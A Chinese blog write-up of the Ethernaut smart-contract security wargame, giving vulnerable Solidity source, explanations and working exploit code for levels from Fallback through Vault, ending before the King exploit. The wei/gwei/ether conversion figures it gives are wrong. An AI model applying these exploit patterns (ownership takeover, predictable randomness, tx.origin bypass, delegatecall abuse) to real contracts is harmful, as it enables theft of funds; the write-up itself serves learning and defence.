---
title: "区块链初探-1"
description: "区块链初探 在好兄弟们的帮助下，终于开始进行区块链漏洞的学习，先是从Ethernaut (openzeppelin.com)开始入手（当脚本小子）。solidity基础：https://cryptozombies.io/zh/ 准备 配置MetaMask MetaMask是一款插件型（无需下载客户端）轻量级数字货币钱包，官网：The Ultimate Cr…"
publishedAt: "2024-03-06T19:52:51+08:00"
route: "/2024/03/06/区块链初探-1/"
categories: ["Blockchain"]
tags: []
legacyId: 313
draft: false
---

<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<title>区块链初探</title>
</head>
<body><div><nav class="post-toc" data-auto-toc aria-label="文章目录"></nav></div>
<p>在好兄弟们的帮助下，终于开始进行区块链漏洞的学习，先是从<a href='https://ethernaut.openzeppelin.com/'>Ethernaut (openzeppelin.com)</a>开始入手（当脚本小子）。solidity基础：<a href='https://cryptozombies.io/zh/' target='_blank' class='url' rel="noopener">https://cryptozombies.io/zh/</a></p>
<h2 id='准备'>准备</h2>
<p>配置MetaMask</p>
<p>MetaMask是一款插件型（无需下载客户端）轻量级数字货币钱包，官网：<a href='https://metamask.io/'>The Ultimate Crypto Wallet for DeFi, Web3 Apps, and NFTs | MetaMask</a>，挂梯子进去，下载安装插件之后，就可以进hello关卡了。</p>
<h2 id='hello-ethernaut'><strong>Hello Ethernaut</strong></h2>
<p>这关是学习如何在控制台交互以及熟悉流程的，领取测试币<a href='https://faucets.chain.link/'>Get Testnet LINK Tokens | Chainlink Faucets</a></p>
<p><code>contract.methods()</code>可以返回方法</p>
<h3 id='exp'>Exp</h3>
<pre><code class='language-javascript' lang='javascript'> await contract.info()
&#39;You will find what you need in info1().&#39;
await contract.info1()
&#39;Try info2(), but with &quot;hello&quot; as a parameter.&#39;
await contract.info2(&quot;hello&quot;)
&#39;The property infoNum holds the number of the next info method to call.&#39;
await contract.infoNum()
i {negative: 0, words: Array(2), length: 1, red: null}length: 1negative: 0red: nullwords: (2) [42, 空][[Prototype]]: Object
await contract.info42()
&#39;theMethodName is the name of the next method.&#39;
await contract.theMethodName()
&#39;The method name is method7123949.&#39;
await contract.method7123949()
&#39;If you know the password, submit it to authenticate().&#39;
await contract.password()
&#39;ethernaut0&#39;
await contract.authenticate(&quot;ethernaut0&quot;)
{tx: &#39;0x030085c40fcc8296100544dcaf0835668d427c7e992c2e9cc2f0af09f13b443b&#39;, receipt: {…}, logs: Array(0)}
</code></pre>
<p>&nbsp;</p>
<h2 id='fallback'>Fallback</h2>
<h3 id='source'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address =&gt; uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            &quot;caller is not the owner&quot;
        );
        _;
    }

  function contribute() public payable {
    require(msg.value &lt; 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] &gt; contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
    owner = msg.sender;
  }
}
</code></pre>
<p>&nbsp;</p>
<h3 id='接收eth函数-receive'>接收ETH函数 receive</h3>
<p><code>receive()</code>函数是在合约收到<code>ETH</code>转账时被调用的函数。一个合约最多有一个<code>receive()</code>函数，声明方式与一般函数不一样，不需要<code>function</code>关键字：<code>receive() external payable { ... }</code>。<code>receive()</code>函数不能有任何的参数，不能返回任何值，必须包含<code>external</code>和<code>payable</code>。</p>
<h3 id='回退函数-fallback'>回退函数 fallback</h3>
<p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。<code>fallback()</code>声明时不需要<code>function</code>关键字，必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰，用于接收ETH:<code>fallback() external payable { ... }</code>。</p>
<p>当合约接收ETH的时候，<code>receive()</code>会被触发。<code>receive()</code>最好不要执行太多的逻辑因为如果别人用<code>send</code>和<code>transfer</code>方法发送<code>ETH</code>的话，<code>gas</code>会限制在<code>2300</code>，<code>receive()</code>太复杂可能会触发<code>Out of Gas</code>报错</p>
<pre><code>触发fallback() 还是 receive()?
           接收ETH
              |
         msg.data是空？
            /  \
          是    否
          /      \
receive()存在?   fallback()
        / \
       是  否
      /     \
receive()   fallback()
</code></pre>
<blockquote><p>以太币的最小单位是wei，在我们传入的value没有货币单位的时候
1 wei == 1
1 gwei == 100000000 wei
1 ether == 10000000000000000 wei
1 ether == 100000000 gwei</p>
</blockquote>
<p>先通过<code>contribute()</code>函数使<code>contributions[msg.sender]</code> &gt; 0，然后用<code>sendTransaction</code>函数，直接向合约转账即可让<code>owner</code>变成自己</p>
<pre><code class='language-javascript' lang='javascript'>await contract.contribute({value: toWei(&quot;0.0001&quot;)})
await contract.sendTransaction({value: toWei(&quot;0.001&quot;)})

</code></pre>
<p>&nbsp;</p>
<h2 id='fallout'>Fallout</h2>
<h3 id='source-2'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address =&gt; uint) allocations;
  address payable public owner;


  
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            &quot;caller is not the owner&quot;
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] &gt; 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
</code></pre>
<p>Solidity 0.4.22 之前的构造函数是和合约同名的（0.4.22及之后都采用constructor(…) {…}来声明构造函数），它只在合约创建时执行一次，题目代码中将<code>function Fallout() public payable</code>书写为<code>function Fal1out() public payable</code>，即变成了一个普通函数，导致可以在外部自由调用，从而改变<code>owner</code></p>
<h3 id='exp-2'>Exp</h3>
<pre><code class='language-javascript' lang='javascript'>await contract.Fal1out();
</code></pre>
<h3 id='sum'>Sum</h3>
<p>虽然这个攻击看着很呆，但是完成后网站会告诉我们</p>
<blockquote><p>这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?</p>
<p>实际上... 也未必.</p>
<p>Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 &#39;Dynamic Pyramid&#39; 改成 &#39;Rubixi&#39; 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:</p>
<pre><code class='language-solidity' lang='solidity'>contract Rubixi {
address private owner;
function DynamicPyramid() { owner = msg.sender; } //就是这里
function collectAllFees() { owner.transfer(this.balance) }
...
</code></pre>
<p>这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的.</p>
</blockquote>
<h2 id='coin-flip'>Coin Flip</h2>
<h3 id='source-3'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
</code></pre>
<blockquote><p><code>block.number (uint)</code>：获取当前块高度</p>
<p><code>sub</code>和<code>div</code>:<code>SafeMath</code>中的方法（减，整除）</p>
<p><code>blockhash(uint blockNumber) returns (bytes32)</code> ：给定块的哈希，仅适用于最近256个块</p>
<p><code>revert()</code>：中止执行并还原状态更改</p>
</blockquote>
<p>代码逻辑为</p>
<ul>
<li>获取上一块的哈希</li>
<li>判断与上一次运行<code>flip</code>函数时得到的哈希是否相同，相同则中止</li>
<li>记录得到的哈希</li>
<li>用得到的哈希整除<code>FACTOR</code>（uint256取值范围为[0,2<sup>256-1]，FACTOR为2</sup>255），结果只会是1或0</li>
<li>以整除的结果作为判断条件</li>

</ul>
<p>代码尝试用<code>blockhash(block.number.sub(1))</code>生成随机数，然而并非随机。在区块链网络中，数据会以文件的形式被永久记录，这些文件称为区块。区块是区块链的基本结构单元，由包含元数据的区块头和包含交易数据的区块主体构成。目前比特币区块链系统大约每10分钟会创建一个区块，eth系统则是十几秒产生一个区块。我们只需要调用题目中的合约，就可以获得每次产生的结果从而进行攻击，这样两个交易一定被打包在同一个区块上。</p>
<p><img src="/wp-content/uploads/2024/03/1709725839-3aa9bb1bf8ff307a52b5799d6d6a10e3.png" referrerpolicy="no-referrer" alt="3aa9bb1bf8ff307a52b5799d6d6a10e3"></p>
<p>部署之后，</p>
<p><img src="/wp-content/uploads/2024/03/1709725852-e200d819671d515c51f2175b2aba32a1.png" referrerpolicy="no-referrer" alt="e200d819671d515c51f2175b2aba32a1"></p>
<h3 id='exp-3'>EXP</h3>
<pre><code class='language-solidity' lang='solidity'>pragma solidity ^0.8.0;

abstract contract CoinFlip {
  function flip(bool _guess) virtual public returns (bool);
}

contract Attack {
    CoinFlip coinFlip = CoinFlip(0x0567691A9bB1A5420719CA5b2Ace8bA828F5b776);//这里填实例地址
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        return coinFlip.flip(side);
    }
}

</code></pre>
<h3 id='sum-2'>Sum</h3>
<p>执行10次之后，提交实例网站会告诉我们：</p>
<blockquote><p>通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.</p>
</blockquote>
<p>&nbsp;</p>
<h2 id='telephone'>Telephone</h2>
<h3 id='source-4'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
</code></pre>
<p>这道题需要了解<code>tx.origin</code>和<code>msg.sender</code>的区别。假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A-&gt;C，那么在C合约看来，A既是<code>tx.origin</code>，又是<code>msg.sender</code>。如果调用链是A-&gt;B-&gt;C，那么对于合约C来说，A是<code>tx.origin</code>，B是<code>msg.sender</code>，即<code>msg.sender</code>是直接调用的一方，而<code>tx.origin</code>是交易的原始发起者。</p>
<p>用户可以通过另一个合约 <code>Attack</code> 来调用目标合约中的 <code>changeOwner()</code>，此时，<code>tx.origin</code> 为用户，<code>msg.sender</code> 为 <code>Attack</code>，即可绕过条件，成为 owner。</p>
<h3 id='exp-4'>EXP</h3>
<pre><code class='language-solidity' lang='solidity'>pragma solidity ^0.8.0;

abstract contract Telephone {
  function changeOwner(address _owner) virtual public ;
}

contract Attack {
    Telephone telephone = Telephone(0x620DFC1c05EdEfDB58f7eab8F13e330D648b867c);//实例地址

    function exploit() public {
        telephone.changeOwner(0xbc2b8A74d29054491051D2aBC5F0C57b98444785);//自己的钱包地址
    }
}
</code></pre>
<p>部署并执行exp后，在控制台我们看到，此时合约的owner已经变成了自己。</p>
<pre><code class='language-javascript' lang='javascript'>await contract.owner()
&#39;0xbc2b8A74d29054491051D2aBC5F0C57b98444785&#39;
</code></pre>
<h3 id='sum-3'>Sum</h3>
<blockquote><p>这个例子比较简单, 混淆 <code>tx.origin</code> 和 <code>msg.sender</code> 会导致 phishing-style 攻击, 比如<a href='https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/'>this</a>.</p>
<p>下面描述了一个可能的攻击:</p>
<p>使用 <code>tx.origin</code> 来决定转移谁的token, 比如.</p>
<pre><code class='language-solidity' lang='solidity'>function transfer(address _to, uint _value) {
tokens[tx.origin] -= _value;
tokens[_to] += _value;
}
</code></pre>
<p>攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如</p>
<pre><code class='language-solidity' lang='solidity'>function () payable {
token.transfer(attackerAddress, 10000);
}
</code></pre>
<p>在这个情况下, <code>tx.origin</code> 是受害者的地址 ( <code>msg.sender</code> 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.</p>
</blockquote>
<h2 id='token'>Token</h2>
<h3 id='source-5'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address =&gt; uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value &gt;= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
</code></pre>
<p>这个题考察整数溢出的问题，题目说明中告知初始已经给我们分配了20个token，所以我们只需要调用transfer函数，执行<code>transfer(instance,21)</code>，那么<code>balances[msg.sender] - _value</code>的结果为-1，由于是uint类型，会变成<mjx-container class="MathJax" jax="SVG" style="position: relative;"><svg xmlns="http://www.w3.org/2000/svg" width="7.616ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3366.1 915.9" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style="vertical-align: -0.186ex;"><defs><path id="MJX-2-TEX-N-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path id="MJX-2-TEX-N-35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path id="MJX-2-TEX-N-36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path id="MJX-2-TEX-N-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path><path id="MJX-2-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><use data-c="32" xlink:href="#MJX-2-TEX-N-32"></use></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><use data-c="32" xlink:href="#MJX-2-TEX-N-32"></use><use data-c="35" xlink:href="#MJX-2-TEX-N-35" transform="translate(500,0)"></use><use data-c="36" xlink:href="#MJX-2-TEX-N-36" transform="translate(1000,0)"></use></g></g></g><g data-mml-node="mo" transform="translate(1865.9,0)"><use data-c="2212" xlink:href="#MJX-2-TEX-N-2212"></use></g><g data-mml-node="mn" transform="translate(2866.1,0)"><use data-c="31" xlink:href="#MJX-2-TEX-N-31"></use></g></g></g></svg></mjx-container><script type="math/tex">2^{256}-1</script>这样一个很大的数字，从而实现攻击。</p>
<h3 id='exp-5'>EXP</h3>
<pre><code class='language-javascript' lang='javascript'>await contract.methods
{balanceOf(address): ƒ, totalSupply(): ƒ, transfer(address,uint256): ƒ}balanceOf(address): ƒ ()totalSupply(): ƒ ()transfer(address,uint256): ƒ ()[[Prototype]]: Object
await contract.balanceOf(player)
i {negative: 0, words: Array(2), length: 1, red: null}length: 1negative: 0red: nullwords: (2) [20, 空][[Prototype]]: Object
await contract.transfer(instance, 21)
{tx: &#39;0x110038dbfc1848c6d8463344d841989467940977328f7afab72264bd91be5f22&#39;, receipt: {…}, logs: Array(0)}
await contract.balanceOf(player)
i {negative: 0, words: Array(11), length: 10, red: null}length: 10negative: 0red: nullwords: (11) [67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 4194303, 空][[Prototype]]: Object

</code></pre>
<h3 id='sum-4'>Sum</h3>
<blockquote><p>Overflow 在 solidity 中非常常见, 你必须小心检查, 比如下面这样:</p>
<pre><code>if(a + c &gt; a) {
a = a + c;
}
</code></pre>
<p>另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:</p>
<pre><code>a = a.add(c);
</code></pre>
<p>如果有溢出, 代码会自动恢复.</p>
</blockquote>
<p>溢出问题似乎在0.8.0之前存在，在之后的版本编译器会做默认检查。</p>
<h2 id='delegation'>Delegation</h2>
<h3 id='source-6'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
</code></pre>
<p>在 Solidity 中，<code>call</code> 函数簇可以实现跨合约的函数调用功能，其中包括 <code>call</code>、<code>delegatecall</code> 和 <code>callcode</code> 三种方式。</p>
<p>以下是 Solidity 中 <code>call</code> 函数簇的调用模型：</p>
<pre><code>&lt;address&gt;.call(...) returns (bool)
&lt;address&gt;.callcode(...) returns (bool)
&lt;address&gt;.delegatecall(...) returns (bool)
</code></pre>
<p>这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。</p>
<p>在函数调用的过程中， Solidity 中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p>
<p><strong>三种调用方式的异同点</strong></p>
<ul>
<li>call: 最常用的调用方式，调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，执行环境为<strong>被调用者</strong>的运行环境(合约的 storage)。</li>
<li>delegatecall: 调用后内置变量 <code>msg</code> 的值<strong>不会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</li>
<li>callcode: 调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</li>

</ul>
<p>&nbsp;</p>
<p>在智能合约的开发过程中，合约的相互调用是经常发生的。开发者为了实现某些功能会调用另一个合约的函数。比如下面的例子，调用一个合约 A 的 <code>test()</code> 函数，这是一个正常安全的调用。</p>
<pre><code class='language-solidity' lang='solidity'>function test(uint256 a) public {
    // codes
}

function callFunc() public {
    &lt;A.address&gt;.delegatecall(bytes4(keccak256(&quot;test(uint256)&quot;)), 10);
}
</code></pre>
<p>但是在实际开发过程中，开发者为了兼顾代码的灵活性，往往会有下面这种写法：</p>
<pre><code class='language-solidity' lang='solidity'>function callFunc(address addr, bytes data) public {
    addr.delegatecall(data);
}
</code></pre>
<p>这将引起任意 public 函数调用的问题：合约中的 <code>delegatecall</code> 的调用地址和调用的字符序列都由用户传入，那么完全可以调用任意地址的函数。</p>
<p>除此之外，<code>delegatecall</code> 所在合约 (A) 在调用其他合约 (B) 的函数时，所用到的很多状态( 比如 msg.sender )都是 A 合约里面的。以及当 A 和 B 合约有一样的变量时，使用的是 A 合约中的变量。</p>
<p>通过转账触发 <code>Delegation</code> 合约的 <code>fallback</code> 函数，同时设置 <code>data</code> 为 <code>pwn</code> 函数的标识符（<code>data</code> 头4个byte是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , remix 里调用函数，实际是向合约账户地址发送了<code>msg.data[0:4]</code> 为函数签名哈希的一笔交易）。然后在<code>Delegate</code> 合约里面的 <code>pwn</code> 函数就会修改 <code>Delegation</code> 合约的 <code>owner</code> 变量为我们的合约地址。</p>
<h3 id='exp-6'>EXP</h3>
<pre><code class='language-solidity' lang='solidity'>contract.sendTransaction({data:web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)})

</code></pre>
<p>这里<code>slice(0,10)</code>是因为前面还有个0x，加上0x一共10个字符。</p>
<h3 id='sum-5'>Sum</h3>
<blockquote><p>使用<code>delegatecall</code> 是很危险的, 而且历史上已经多次被用于进行 attack vector. 使用它, 你对合约相当于在说 &quot;看这里, -其他合约- 或是 -其它库-, 来对我的状态为所欲为吧&quot;. 代理对你合约的状态有完全的控制权. <code>delegatecall</code> 函数是一个很有用的功能, 但是也很危险, 所以使用的时候需要非常小心.</p>
<p>请参见 <a href='https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7'>The Parity Wallet Hack Explained</a> 这篇文章, 他详细解释了这个方法是如何窃取三千万美元的.</p>
</blockquote>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2 id='force'>Force</h2>
<h3 id='source-7'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
</code></pre>
<p>尝试直接向合约转账的话会被revert（没有<code>receive()</code>也没有<code>payable</code>修饰的<code>fallback()</code>函数）</p>
<p>不过另一个合约可以通过自毁 <code>selfdestruct</code> ，强行给一个合约发送 <code>eth</code>，可以将余额全部强制转到另一个地址上，所以新建一个合约然后自毁，把余额转到实例地址上就可以了。</p>
<h3 id='exp-7'>Exp</h3>
<pre><code class='language-solidity' lang='solidity'>pragma solidity ^0.8.0;

contract ForceAttack {

  constructor() public payable {}
  receive() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
</code></pre>
<h3 id='sum-6'>Sum</h3>
<blockquote><p>在solidity中, 如果一个合约要接受 ether, fallback 方法必须设置为 <code>payable</code>.</p>
<p>但是, 并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 <code>address(this).balance == 0</code> 之上.</p>
</blockquote>
<p>&nbsp;</p>
<h2 id='vault'>Vault</h2>
<h3 id='source-8'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
</code></pre>
<p>分析源码可以知道，需要我们获取私有变量<code>password</code>，虽然因为private我们不能直接看到，然而我们要知道这是在以太坊上，这是一个区块链，它是透明的，数据都是存在<code>block</code>里面的，所以我们可以直接拿到它。</p>
<p>这里通过<code>getStorageAt</code>函数来访问它，<code>getStorageAt</code>函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置<code>position</code>，它是按照变量声明的顺序从0开始，顺次加1，不过对于<code>mapping</code>这样的复杂类型，<code>position</code>的值就没那么简单了。</p>
<h3 id='getstorageat'>getStorageAt</h3>
<pre><code class='language-javascript' lang='javascript'>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])
</code></pre>
<p>获取地址在某个特定位置的存储值。</p>
<h4 id='参数'>参数</h4>
<ol start='' >
<li><code>String</code> - 用来获取存储值的地址。</li>
<li><code>Number|String|BN|BigNumber</code> - 存储的索引位置。</li>
<li><code>Number|String|BN|BigNumber</code> - (可选) 如果传入值则会覆盖通过 <a href='https://learnblockchain.cn/docs/web3.js/web3-eth.html#eth-defaultblock'>web3.eth.defaultBlock</a> 设置的默认区块号。预定义的区块号可以使用 <code>&quot;latest&quot;</code>, <code>&quot;earliest&quot;</code> <code>&quot;pending&quot;</code>, 和 <code>&quot;genesis&quot;</code> 等值。</li>
<li><code>Function</code> - (可选) 可选的回调函数，其第一个参数为错误对象，第二个参数为函数运行结果。</li>

</ol>
<h4 id='返回值'>返回值</h4>
<p><code>Promise</code> 返回 <code>String</code> - 给定位置的存储值。</p>
<h4 id='代码示例'>代码示例</h4>
<pre><code class='language-javascript' lang='javascript'>web3.eth.getStorageAt(&quot;0x407d73d8a49eeb85d32cf465507dd71d507100c1&quot;, 0)
.then(console.log);
&gt; &quot;0x033456732123ffff2342342dd12342434324234234fd234fd23fd4f23d4234&quot;
</code></pre>
<h3 id='exp-8'>Exp</h3>
<pre><code class='language-javascript' lang='javascript'>&gt; await web3.eth.getStorageAt(instance, 1) // 0 为 locked 的位置，1 为 password
&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;
&gt; web3.utils.toAscii(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)
&#39;A very strong secret password :)&#39;
&gt; await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)
// 参数是 bytes32，所以不能直接传字符串进去
</code></pre>
<h3 id='sum-7'>Sum</h3>
<blockquote><p>请记住, 将一个变量设制成私有, 只能保证不让别的合约访问他. 设制成私有的状态变量和本地变量, 依旧可以被公开访问.</p>
<p>为了确保数据私有, 需要在上链前加密. 在这种情况下, 密钥绝对不要公开, 否则会被任何想知道的人获得. <a href='https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/'>zk-SNARKs</a> 提供了一个可以判断某个人是否有某个秘密参数的方法,但是不必透露这个参数.</p>
</blockquote>
<p>&nbsp;</p>
<h2 id='king'>King</h2>
<h3 id='source-9'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value &gt;= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
</code></pre>
<p>Solidity的三种转账方式：</p>
<ul>
<li><p><code>&lt;address payable&gt;.transfer(uint256 amount)</code></p>
<p>当发送失败时会 <code>throw</code> ，回滚状态</p>
<p>只会传递部分 <code>Gas</code> 供调用，防止重入</p>
</li>
<li><p><code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code></p>
<p>当发送失败时会返回 <code>false</code>
只会传递部分 <code>Gas</code> 供调用，防止重入</p>
</li>
<li><p><code>&lt;address payable&gt;.call.value()()</code></p>
<p>当发送失败时会返回 <code>false</code>
传递所有可用 <code>Gas</code> 供调用，不能有效防止重入</p>
</li>

</ul>
<p>如果使用<code>addr.transfer(1 ether)</code>、<code>addr.send(1 ether)</code>，addr合约中必须增加fallback回退函数。如果使用<code>addr.call.value(1 ether)</code>，那么被调用的方法必须添加<code>payable</code>修饰符，否则转账失败。</p>
<p>题目通过<code>king.transfer(msg.value);</code>向之前的<code>king</code>转账，<code>transfer</code>这种方式失败会<code>throws</code> 错误，无法继续执行下面的代码，所以只要让转账时出错，就不会产生新的<code>king</code>。而我们知道，如果向一个没有 <code>fallback</code> 函数的合约，或 <code>fallback</code> 不带 <code>payable</code> 的合约发送 <code>Ether</code>，则会报错。</p>
<p>在这之前需要先看一下当前的<code>prize</code></p>
<pre><code class='language-javascript' lang='javascript'>await fromWei((await contract.prize()))
&#39;0.001&#39;
</code></pre>
<h3 id='exp-9'>Exp</h3>
<p>部署Hack合约，调用函数，传入实例地址和0.001 Ether</p>
